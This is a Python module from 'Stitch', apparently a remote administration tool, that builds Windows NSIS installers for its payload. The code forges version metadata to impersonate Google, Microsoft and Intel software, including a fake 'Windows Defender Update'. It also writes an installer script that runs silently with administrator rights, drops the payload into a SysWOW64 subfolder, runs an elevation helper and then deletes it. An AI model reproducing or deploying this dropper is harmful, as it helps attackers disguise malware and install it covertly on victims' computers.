# -*- coding: utf-8 -*-
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import shutil
import subprocess

################################################################################
#                         NSIS Installer Variables                             #
################################################################################

nsis_Path = {'chrome':'Google',
'drive' : 'WDRV',
'IAStorIcon' : 'IAS',
'SecEdit' : 'WSEC',
'searchfilterhost' : 'WSRCH',
'WUDFPort' : 'WUDF',
'MSASTUIL' : 'WSEC',
'WmiPrvSE' : 'WMIP'}

nsis_Version={'chrome':'52.0.2743.116',
'drive' : '17.3.6517.0809',
'IAStorIcon' : '14.5.0.1081',
'SecEdit' : '10.0.14393.0',
'searchfilterhost' : '52.0.2743.116',
'WUDFPort' : '10.0.10586.0',
'MSASTUIL' : '4.10.14393.0',
'WmiPrvSE' : '10.0.14393.0'}

nsis_ProductName = {'chrome':'stGoogle Installer.exe',
'drive' : 'stWindows Drive Installer.exe',
'IAStorIcon' : 'stIntel Iastor Installer.exe',
'SecEdit' : 'stWindows SecEdit Update.exe',
'searchfilterhost' : 'stWindows SearchConfig Installer.exe',
'WUDFPort' : 'stWindows Ports Manager Installer.exe',
'MSASTUIL' : 'stWindows Defender Update.exe',
'WmiPrvSE' : 'stWindows WmiPrv Installer.exe'}

nsis_CompanyName={'chrome':'stGoogle Inc.',
'drive' : 'stMicrosoft Corporation',
'IAStorIcon' : 'stIntel Corporation',
'SecEdit' : 'stMicrosoft Corporation',
'searchfilterhost' : 'stMicrosoft Corporation',
'WUDFPort' : 'stMicrosoft Corporation',
'MSASTUIL' : 'stMicrosoft Corporation',
'WmiPrvSE' : 'stMicrosoft Corporation'}

nsis_LegalCopyright={'chrome':'Copyright 2016 stGoogle Inc. All rights reserved.',
'drive' : "stMicrosoft Corporation. All rights reserved.",
'IAStorIcon' : "Copyright stIntel Corporation. All rights reserved.",
'SecEdit' : "stMicrosoft Corporation. All rights reserved.",
'searchfilterhost' : "stMicrosoft Corporation. All rights reserved.",
'WUDFPort' : "stMicrosoft Corporation. All rights reserved.",
'MSASTUIL' : "stMicrosoft Corporation. All rights reserved.",
'WmiPrvSE' : "stMicrosoft Corporation. All rights reserved."}

nsis_Name = {'chrome':'stGoogle Installer',
'drive' : 'stWindows Drive Installer',
'IAStorIcon' : 'stIntel Iastor Installer',
'SecEdit' : 'stWindows SecEdit Update',
'searchfilterhost' : 'stWindows SearchConfig Installer',
'WUDFPort' : 'stWindows Ports Manager Installer',
'MSASTUIL' : 'stWindows Defender Update',
'WmiPrvSE' : 'stWindows WmiPrv Installer'}

nsis_InternalName={'chrome':'stGoogle NSIS Library',
'drive' : 'stWindows Drive NSIS Library',
'IAStorIcon' : 'stIntel Iastor NSIS Library',
'SecEdit' : 'stWindows SecEdit NSIS Library',
'searchfilterhost' : 'stWindows SearchConfig NSIS Library',
'WUDFPort' : 'stWindows Ports Manager NSIS Library',
'MSASTUIL' : 'stWindows Defender NSIS Library',
'WmiPrvSE' : 'stWindows WmiPrv NSIS Library'}

################################################################################
#                       NSIS Script Setup Variables                            #
################################################################################

def run_command(command):
    try:
        subp = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
        subp_output, errors = subp.communicate()
        if not errors:
            if subp_output == '':
                return '[+] Command successfully executed.\n'
            else:
                return subp_output
        return "[!] {}\n".format(errors)
    except KeyboardInterrupt:
        print "Terminated command."

def no_error(cmd_output):
    if cmd_output.startswith("ERROR:") or cmd_output.startswith("[!]"):
        return False
    else:
        return True

def gen_nsis(conf_dir, name, outfile, path, elevation_path):
    exe_name = '{}.exe'.format(name)
    setup_nsi='''
!include "LogicLib.nsh"
!include "x64.nsh"

ShowInstDetails "nevershow"
ShowUninstDetails "nevershow"
RequestExecutionLevel admin
SilentInstall silent

SetCompressor lzma

VIProductVersion                 "{0}"
VIAddVersionKey ProductName      "{1}"
VIAddVersionKey CompanyName      "{2}"
VIAddVersionKey LegalCopyright   "{2}"
VIAddVersionKey FileDescription  "Installation Database"
VIAddVersionKey FileVersion      {0}
VIAddVersionKey ProductVersion   {0}
VIAddVersionKey InternalName     "{3}"
VIAddVersionKey LegalTrademarks  "{4}"
VIAddVersionKey OriginalFilename "{1}"
BrandingText "{2}"
Name "{5}"
OutFile "{6}"

InstallDir C:\

Section "payload"

    SetOutPath $INSTDIR\Windows\SysWOW64\{7}
    SetCompress off
    File insts\{8}
    SetCompress auto

    SetOutPath $INSTDIR\Windows\Temp
    SetCompress off
    File insts\elevate.exe
    ExecWait '"$INSTDIR\Windows\Temp\elevate.exe"'
    SetCompress auto

    Exec '"$INSTDIR\Windows\SysWOW64\{7}\{8}"'
    Delete '"$INSTDIR\Windows\Temp\elevate.exe"'

SectionEnd'''.format(nsis_Version[name],nsis_ProductName[name],nsis_CompanyName[name],
            nsis_InternalName[name],nsis_LegalCopyright[name],nsis_Name[name],outfile,path,exe_name)

    nsis_script = os.path.join(conf_dir,'nsis_setup.nsi')
    with open(nsis_script,'wb') as ns:
        ns.write(setup_nsi)

    insts_dir = os.path.join(conf_dir,'insts')
    installer_dir = os.path.join(conf_dir,'NSIS Installers')
    if not os.path.exists(insts_dir):
        os.makedirs(insts_dir)
    if not os.path.exists(installer_dir):
        os.makedirs(installer_dir)

    exe_path = os.path.join(conf_dir,exe_name)
    insts_exe = os.path.join(insts_dir,exe_name)
    elevate = os.path.join(elevation_path,'elevate.exe')
    shutil.copy(exe_path, insts_dir)
    shutil.copy(elevate, insts_dir)

    nsis_payload = run_command('"C:\\Program Files (x86)\\NSIS\\makensis.exe" "{}"'.format(nsis_script))
    if no_error(nsis_payload):
        instllr_path = os.path.join(conf_dir,outfile)
        nsis_instllr_path = os.path.join(installer_dir,outfile)
        if os.path.exists(instllr_path):
            os.rename(instllr_path,nsis_instllr_path)
        #st_print('[+] NSIS payload complete')
    else:
        st_print('[!] Error creating NSIS payload with {} configuration'.format(exe_name))

    os.remove(nsis_script)
    shutil.rmtree(insts_dir)
